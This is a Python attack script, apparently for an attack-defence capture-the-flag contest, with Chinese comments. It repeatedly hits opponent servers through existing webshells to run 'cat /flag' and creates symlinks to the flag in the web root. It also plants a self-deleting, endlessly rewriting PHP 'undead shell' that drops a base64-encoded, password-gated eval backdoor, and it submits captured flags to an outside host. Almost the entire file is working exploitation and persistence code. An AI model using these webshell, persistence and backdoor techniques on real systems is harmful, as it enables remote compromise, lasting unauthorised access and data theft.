import requests as req
import os
import re
from urllib.parse import quote
from pprint import pprint
import time
import copy
import base64


class attack:
    def __init__(self):
        '''比赛信息相关配置'''
        # self.IPs = [f"192.168.121.{i}" for i in range(100, 254)]
        self.IPs = [f"192.168.121.{i}" for i in [228, 106, 63]]
        self.my_ip = '192.168.121.254'
        self.port = '4444'
        self.flag_location = '/flag'  # flag的所在位置
        self.FLAG_FORMAT = r'flag{[a-zA-Z0-9_\-]{5,32}}'

        '''配置文件'''
        self.config = '/tmp/shell.txt' # webshell写入这个目录
        self.link = '/tmp/link.txt' # 软连接写入这个文件

        '''软连接相关'''
        self.link_path = 'cache'  # 表示相对于网站根目录的目录
        self.link_name = 'avatar.jpg' # 软连接的名字
        self.links = []

        """不死马相关配置"""
        self.web_root = '/var/www/html/'  # 网站根目录
        self.bsm_path = 'cache'  # 表示相对于网站根目录的目录
        self.bsm1_name = '.bsm.php' # 用于生成.config.php
        self.bsm2_name = '.config.php' # 实际的webshell

        '''讲现有的webshell存入这里 如果是对于多个ip都有这个shell 则可直接写 f"http://S3CRRR3TIP:{self.port}/" '''
        self.webshell = [{
            'URL': f"http://S3CRRR3TIP:{self.port}/blocks/news.php",
            'POST': {
                'ff': 'system',
                'x': 'C0Mm4nD'
            },
            'headers': {}
        }]
        # self.IPs.remove(self.my_ip)

    def run(self):
        cnt = 0
        while (True):
            self.prepare_exploit()
            if cnt % 10 == 0:
                self.undead_shell()
                self.soft_link()
            cnt += 1
            print('\n\n===============一轮全场攻击已完成===============\n\n')
            time.sleep(20)

    '''get flag'''
    def prepare_exploit(self):
        for shell in self.webshell:
            if 'S3CRRR3TIP' in shell['URL']:
                for ip in self.IPs:
                    shell2 = copy.deepcopy(shell)
                    shell2['URL'] = shell2['URL'].replace('S3CRRR3TIP', ip)
                    self.do_exploit(shell2)
                    time.sleep(2)
                    print('\n------------------------------\n')
            else:
                shell2 = copy.deepcopy(shell)
                self.do_exploit(shell2)
            time.sleep(2)

    '''get flag'''
    def do_exploit(self, shell):
        try:
            if shell['POST']:
                for post_param in shell['POST']:
                    # shell执行PHP命令
                    if shell['POST'][post_param] == 'C00DE':
                        shell['POST'][post_param] = f"echo(file_get_contents('{self.flag_location}'));";
                    # shell执行系统命令
                    if shell['POST'][post_param] == 'C0Mm4nD':
                        shell['POST'][post_param] = f"cat {self.flag_location}";
                # print(shell)
                r = req.post(url=shell['URL'],
                             data=shell['POST'],
                             headers=shell['headers'],
                             timeout=3)
                print("[*] 正在攻击" + shell['URL'])
            else:
                if 'C00DE' in shell['URL']:
                    r = req.get(url=shell['URL'].replace('C00DE', f"echo(file_get_contents('{self.flag_location}'));"),
                                headers=shell['headers'], timeout=3)
                if 'C0Mm4nD' in shell['URL']:
                    r = req.get(url=shell['URL'].replace('C0Mm4nD', f"cat {self.flag_location}"),
                                headers=shell['headers'], timeout=3)
            rr = re.search(self.FLAG_FORMAT, r.text).span()
            flag = r.text[rr[0]:rr[1]]
            print(f'[+] 通过webshell获得flag成功 {flag} 准备提交')
            self.submit_flag(flag)
        except Exception as e:
            print('[-] get flag失败，抛出异常', e)

    '''flag软链接'''
    def soft_link(self):
        for shell in self.webshell:
            if 'S3CRRR3TIP' in shell['URL']:
                for ip in self.IPs:
                    shell2 = copy.deepcopy(shell)
                    shell2['URL'] = shell2['URL'].replace('S3CRRR3TIP', ip)
                    self.do_softlink(shell2)
                    time.sleep(2)
                    print('\n------------------------------\n')
            else:
                shell2 = copy.deepcopy(shell)
                self.do_softlink(shell2)
            time.sleep(2)

    '''flag软链接'''
    def do_softlink(self, shell):
        link_location = os.path.join(self.web_root, self.link_path, self.link_name)
        code = f"system('ln -s {self.flag_location} {link_location}');"
        cmd = f"ln -s {self.flag_location} {link_location}"
        try:
            if shell['POST']:
                for post_param in shell['POST']:
                    # shell执行PHP命令
                    if shell['POST'][post_param] == 'C00DE':
                        shell['POST'][post_param] = code;
                    # shell执行系统命令
                    if shell['POST'][post_param] == 'C0Mm4nD':
                        shell['POST'][post_param] = cmd;
                # print(shell)
                r = req.post(url=shell['URL'],
                             data=shell['POST'],
                             headers=shell['headers'],
                             timeout=3)
            else:
                if 'C00DE' in shell['URL']:
                    r = req.get(url=shell['URL'].replace('C00DE', code),
                                headers=shell['headers'], timeout=3)
                elif 'C0Mm4nD' in shell['URL']:
                    r = req.get(url=shell['URL'].replace('C0Mm4nD', cmd),
                                headers=shell['headers'], timeout=3)

            print("[*] 正在生成软链接维持访问 ")
            ip = shell['URL'].split(':')[1].replace('//', '')
            link = f"http://{ip}:{self.port}/{self.link_path}/{self.link_name}"
            try:
                r = req.get(url=link, timeout=3)
                rr = re.search(self.FLAG_FORMAT, r.text).span()
                flag = r.text[rr[0]:rr[1]]
            except Exception as e:
                print("[-] 软连接failed", e)
                return

            print(f'[+] 通过软连接获得flag成功 {flag} 准备提交')
            self.submit_flag(flag)
            self.add_link(link)
        except Exception as e:
            print('[-] get flag失败，抛出异常', e)

    '''不死马'''
    def undead_shell(self):
        for shell in self.webshell:
            if 'S3CRRR3TIP' in shell['URL']:
                for ip in self.IPs:
                    shell2 = copy.deepcopy(shell)
                    shell2['URL'] = shell2['URL'].replace('S3CRRR3TIP', ip)
                    self.do_undead(shell2, ip)
            else:
                ip = shell2['URL'].split(':')[1].replace('//', '')
                self.do_undead(shell2, ip)

    '''不死马'''
    def do_undead(self, shell1, ip=False):
        bsm1_location = os.path.join(self.web_root, self.bsm_path, self.bsm1_name)  # 尝试修改路径到一个可写的目录
        bsm2_location = os.path.join(self.web_root, self.bsm_path, self.bsm2_name)
        print(f"[*] 开始对{ip}进行不死马注入")
        shell_content = '''<?php 
            ignore_user_abort(true);
            set_time_limit(0);
            unlink(__FILE__);
            $file = '%s';
            $code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsicGFzcyJdKT09IjI5MGNiMTI2ZmIzZTk1OTZkODZlM2I3YWMzYWE1Y2M5Iil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+');
            while (1){
                file_put_contents($file,$code);
                usleep(100);
            }
            ?>''' % bsm2_location
        shell_content_b64 = base64.b64encode(shell_content.encode()).decode()
        print(f"[*] 触发不死马的php文件应该被写入在{bsm1_location} ,而后在{bsm2_location}生成不死马")
        bsm_content = f'''file_put_contents('{bsm1_location}', base64_decode('{shell_content_b64}'));'''
        bsm_command = f'''echo '{shell_content_b64}' | base64 -d > {bsm1_location}'''
        ''' 不死马使用说明 POST pass=S4Ck92x2iRnZmQ10PoXHSiw&a=system('cat /flag');'''
        shell = copy.deepcopy(shell1)
        try:
            if shell['POST']:
                for post_param in shell['POST']:
                    # shell执行PHP命令
                    if shell['POST'][post_param] == 'C00DE':
                        shell['POST'][post_param] = bsm_content;
                    # shell执行系统命令
                    if shell['POST'][post_param] == 'C0Mm4nD':
                        shell['POST'][post_param] = bsm_command;
                req.post(url=shell['URL'],
                         data=shell['POST'],
                         headers=shell['headers'], timeout=3)
            else:
                if 'C00DE' in shell['URL']:
                    req.get(url=shell['URL'].replace('C00DE', bsm_content), headers=shell['headers'], timeout=3)
                elif 'C0Mm4nD' in shell['URL']:
                    req.get(url=shell['URL'].replace('C0Mm4nD', bsm_content), headers=shell['headers'], timeout=3)
        except Exception as e:
            print('[-] 不死马生成失败，抛出异常', e)
            return

        try:
            r = req.get(
                url=f"http://{ip}:{self.port}/" + os.path.join(self.bsm_path, self.bsm1_name),
                timeout=3)
            print('[-] 不死马失败', r.text)
            return
        except Exception as e:
            if "timeout" in repr(e):
                print('[+]', end='')
                print(' 不死马执行成功 ')
            else:
                print('[-] 不死马失败', e)
                return

        shell = {
            "URL": f"http://{ip}:{self.port}/" + os.path.join(self.bsm_path, self.bsm2_name),
            'POST': {
                'pass': 'S4Ck92x2iRnZmQ10PoXHSiw',
                'a': "C00DE"
            },
            'headers': {}
        }

        self.add_shell(shell)

    def add_shell(self, shell1):
        shell = copy.deepcopy(shell1)
        if shell not in self.webshell:
            print('[+] 添加shell ', shell)
            with open(self.config, 'a+') as f:
                f.write(repr(shell) + '\n')
            self.webshell.append(shell)
        print('')

    def submit_flag(self, flag):
        if re.match(self.FLAG_FORMAT, flag):
            try:
                r = req.get(url=f"http://d.y1ng.vip:12389/submitflag.php?flag={quote(flag)}", timeout=3)
                print("[*] flag提交接口返回结果：", r.text)
            except:
                print(f"[-] {flag}提交失败")
        else:
            print("[-] 你向flag接口提交了非flag内容，请检查:", flag)

    def add_link(self, link):
        if link not in self.links:
            print('[+] 添加link ', link)
            self.links.append(link)
            with open(self.link, 'a+') as f:
                f.write( f'''submit_flag(requests.get(url='{link}', timeout=3).text)''' + '\n')



if __name__ == '__main__':
    att = attack()
    att.run()